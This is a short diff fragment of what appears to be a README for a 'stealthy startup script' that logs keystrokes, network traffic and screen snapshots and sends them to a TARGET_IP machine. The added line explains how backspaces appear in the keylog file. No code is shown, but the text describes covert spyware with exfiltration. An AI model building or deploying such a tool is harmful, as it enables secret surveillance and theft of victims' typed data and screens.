@@ -19,3 +19,4 @@ Stealthy startup script that monitors network traffic, keystrokes, and screen sn
 
 ## Notes
 - The pertinent files regarding the exfiltrated activities can be found in the specified directories in the TARGET_IP machine.
+- "(<)" in the keylog file denotes a logged backspace.
